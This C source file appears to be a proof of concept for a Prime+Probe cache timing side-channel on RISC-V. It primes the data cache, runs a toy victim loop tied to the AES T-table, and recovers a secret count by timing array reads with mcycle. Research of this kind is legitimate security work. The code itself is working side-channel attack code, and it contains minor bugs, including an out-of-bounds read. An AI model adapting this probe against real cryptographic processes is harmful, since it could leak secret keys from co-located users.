#include <stdint.h>


uint64_t array[1024]; //4096= 2*8(Cache Lines)*256(Sets)

uint64_t temp2=0; //in prime
uint64_t temp3; //in victim process
uint64_t temp4; //in probe
uint64_t temp5; //in disruptor

uint32_t xp;
uint32_t *tempv; //in victim process

#define ROL32(a, n) (((a) << (n)) | ((a) >> (32 - (n))))  // rotate from left to right

//Precalculated table (encryption)
 static const uint32_t te[256] =
 {
    0xA56363C6, 0x847C7CF8, 0x997777EE, 0x8D7B7BF6, 0x0DF2F2FF, 0xBD6B6BD6, 0xB16F6FDE, 0x54C5C591,
    0x50303060, 0x03010102, 0xA96767CE, 0x7D2B2B56, 0x19FEFEE7, 0x62D7D7B5, 0xE6ABAB4D, 0x9A7676EC,
    0x45CACA8F, 0x9D82821F, 0x40C9C989, 0x877D7DFA, 0x15FAFAEF, 0xEB5959B2, 0xC947478E, 0x0BF0F0FB,
    0xECADAD41, 0x67D4D4B3, 0xFDA2A25F, 0xEAAFAF45, 0xBF9C9C23, 0xF7A4A453, 0x967272E4, 0x5BC0C09B,
    0xC2B7B775, 0x1CFDFDE1, 0xAE93933D, 0x6A26264C, 0x5A36366C, 0x413F3F7E, 0x02F7F7F5, 0x4FCCCC83,
    0x5C343468, 0xF4A5A551, 0x34E5E5D1, 0x08F1F1F9, 0x937171E2, 0x73D8D8AB, 0x53313162, 0x3F15152A,
    0x0C040408, 0x52C7C795, 0x65232346, 0x5EC3C39D, 0x28181830, 0xA1969637, 0x0F05050A, 0xB59A9A2F,
    0x0907070E, 0x36121224, 0x9B80801B, 0x3DE2E2DF, 0x26EBEBCD, 0x6927274E, 0xCDB2B27F, 0x9F7575EA,
    0x1B090912, 0x9E83831D, 0x742C2C58, 0x2E1A1A34, 0x2D1B1B36, 0xB26E6EDC, 0xEE5A5AB4, 0xFBA0A05B,
    0xF65252A4, 0x4D3B3B76, 0x61D6D6B7, 0xCEB3B37D, 0x7B292952, 0x3EE3E3DD, 0x712F2F5E, 0x97848413,
    0xF55353A6, 0x68D1D1B9, 0x00000000, 0x2CEDEDC1, 0x60202040, 0x1FFCFCE3, 0xC8B1B179, 0xED5B5BB6,
    0xBE6A6AD4, 0x46CBCB8D, 0xD9BEBE67, 0x4B393972, 0xDE4A4A94, 0xD44C4C98, 0xE85858B0, 0x4ACFCF85,
    0x6BD0D0BB, 0x2AEFEFC5, 0xE5AAAA4F, 0x16FBFBED, 0xC5434386, 0xD74D4D9A, 0x55333366, 0x94858511,
    0xCF45458A, 0x10F9F9E9, 0x06020204, 0x817F7FFE, 0xF05050A0, 0x443C3C78, 0xBA9F9F25, 0xE3A8A84B,
    0xF35151A2, 0xFEA3A35D, 0xC0404080, 0x8A8F8F05, 0xAD92923F, 0xBC9D9D21, 0x48383870, 0x04F5F5F1,
    0xDFBCBC63, 0xC1B6B677, 0x75DADAAF, 0x63212142, 0x30101020, 0x1AFFFFE5, 0x0EF3F3FD, 0x6DD2D2BF,
    0x4CCDCD81, 0x140C0C18, 0x35131326, 0x2FECECC3, 0xE15F5FBE, 0xA2979735, 0xCC444488, 0x3917172E,
    0x57C4C493, 0xF2A7A755, 0x827E7EFC, 0x473D3D7A, 0xAC6464C8, 0xE75D5DBA, 0x2B191932, 0x957373E6,
    0xA06060C0, 0x98818119, 0xD14F4F9E, 0x7FDCDCA3, 0x66222244, 0x7E2A2A54, 0xAB90903B, 0x8388880B,
    0xCA46468C, 0x29EEEEC7, 0xD3B8B86B, 0x3C141428, 0x79DEDEA7, 0xE25E5EBC, 0x1D0B0B16, 0x76DBDBAD,
    0x3BE0E0DB, 0x56323264, 0x4E3A3A74, 0x1E0A0A14, 0xDB494992, 0x0A06060C, 0x6C242448, 0xE45C5CB8,
    0x5DC2C29F, 0x6ED3D3BD, 0xEFACAC43, 0xA66262C4, 0xA8919139, 0xA4959531, 0x37E4E4D3, 0x8B7979F2,
    0x32E7E7D5, 0x43C8C88B, 0x5937376E, 0xB76D6DDA, 0x8C8D8D01, 0x64D5D5B1, 0xD24E4E9C, 0xE0A9A949,
    0xB46C6CD8, 0xFA5656AC, 0x07F4F4F3, 0x25EAEACF, 0xAF6565CA, 0x8E7A7AF4, 0xE9AEAE47, 0x18080810,
    0xD5BABA6F, 0x887878F0, 0x6F25254A, 0x722E2E5C, 0x241C1C38, 0xF1A6A657, 0xC7B4B473, 0x51C6C697,
    0x23E8E8CB, 0x7CDDDDA1, 0x9C7474E8, 0x211F1F3E, 0xDD4B4B96, 0xDCBDBD61, 0x868B8B0D, 0x858A8A0F,
    0x907070E0, 0x423E3E7C, 0xC4B5B571, 0xAA6666CC, 0xD8484890, 0x05030306, 0x01F6F6F7, 0x120E0E1C,
    0xA36161C2, 0x5F35356A, 0xF95757AE, 0xD0B9B969, 0x91868617, 0x58C1C199, 0x271D1D3A, 0xB99E9E27,
    0x38E1E1D9, 0x13F8F8EB, 0xB398982B, 0x33111122, 0xBB6969D2, 0x70D9D9A9, 0x898E8E07, 0xA7949433,
    0xB69B9B2D, 0x221E1E3C, 0x92878715, 0x20E9E9C9, 0x49CECE87, 0xFF5555AA, 0x78282850, 0x7ADFDFA5,
    0x8F8C8C03, 0xF8A1A159, 0x80898909, 0x170D0D1A, 0xDABFBF65, 0x31E6E6D7, 0xC6424284, 0xB86868D0,
    0xC3414182, 0xB0999929, 0x772D2D5A, 0x110F0F1E, 0xCBB0B07B, 0xFC5454A8, 0xD6BBBB6D, 0x3A16162C
 };

// The attacker fills the Dcache with their own data: filling each of the 4096 64bit zones with the value 100=0x64
void prime(){
	

    for (register int k = 0; k<2 ; k++) {
		for (register int i = 0; i < 512; i++) {
			array[i+512*k]=100;
			temp2 = array[i+512*k];
		}
	}

}



// In the victim process (VP), the SECRET value is used as the loop index, that is why the number of evictions done by the VP  
// will be equal to this SECRET value . In this case, SECRET=...



void victim_process1() {  

    asm volatile ("add x0, x0, x0");    
    
    for (register int j = 0; j < 6; j++) {  
       tempv[4*j]=4;
       temp3=tempv[4*j]; 
    }
    asm volatile ("add x0, x0, x0"); 
}


void probe() {
	
    int threshold = 26; // We use this threshold to distinguish between cache Hits & cache Misses.
    int res; // we store in res the number of cycles taken by the reading of array elements.
    int secret=1;
    uint64_t addr[4096];
    //uint64_t addr2[4096];
    int x=0;
	for (register int l = 0; l<2 ; l++) {
		for (register int m = 0; m < 512; m++) {

				asm volatile ("csrrs x6, mcycle, x0"); // Count started
				temp4 = array[m+512*l];
				asm volatile ("csrrs x7, mcycle, x0"); // Count ended
				asm volatile ("sub %0, x7, x6;"  
					: "=r" (res)); // We calculate the difference to find the number of cycles taken by the reading of array elements. 

				if (res > threshold) {
                    //asm volatile ("add x0, x0, x0");

                    addr[x]=  (uint64_t)(&array[m+512*l]) & 0x0000000000000ff0 ;  //extract 8 bit index      
                    x+=1;

                    //asm volatile ("add x0, x0, x0");
				}
			
		}
	}

    
    
    int Size=x;
    //asm volatile ("add x0, x0, x0");

    // delete duplicate elements from addr array:
    
    for (int p = 0; p < Size; p++)
	{
		for(int q = p + 1; q < Size; q++)
		{
    		if(addr[p] == addr[q])
    		{
    			for(int k = q; k < Size; k++)
    			{
    				addr[k] = addr[k + 1];
				}
				Size--;
				q--;
			}
		}
	}

    //asm volatile ("add x0, x0, x0");
    // sort the array
    int a ;
    

    for (int i = 0; i < Size; ++i){
        for (int j = i + 1; j < Size; ++j){
            if (addr[i] > addr[j]){
                a = addr[i];
                addr[i] = addr[j];
                addr[j] = a;
            }
        }
    }



    //asm volatile ("add x0, x0, x0");

    //guess the secret

    uint32_t bound=xp & 0x00000ff0; // extract the 8bit index from xp

    int var;
    for (int t = 0; t < Size; t++){
        
        if (addr[t]>=(uint64_t)bound){

            if (addr[t+1]==addr[t]+16){
                secret++;
            }
            else{
                break;
            }

        }
    }

   


	//For easy debugging and log-reading
	asm volatile ("add x0, x0, x0");
	asm volatile ("add x6, %0, x0;"
		:
		: "r" (secret));
	asm volatile ("add x0, x0, x0");	
    //return secret;
        printf("Secret is set to %d", secret);
}



int main(int argc, char const *argv[]){


    xp= (uint32_t)(&te[255]) + 0x00000010; // xp represents the address that targets the set following the last one that can contain an eviction caused by reading Te elements.
    
    tempv = (uint32_t *)xp; 

    prime();
	//asm volatile ("add x0, x0, x0");	
	

    victim_process1();
	//asm volatile ("add x0, x0, x0");


    probe();

    
    return 0;
}









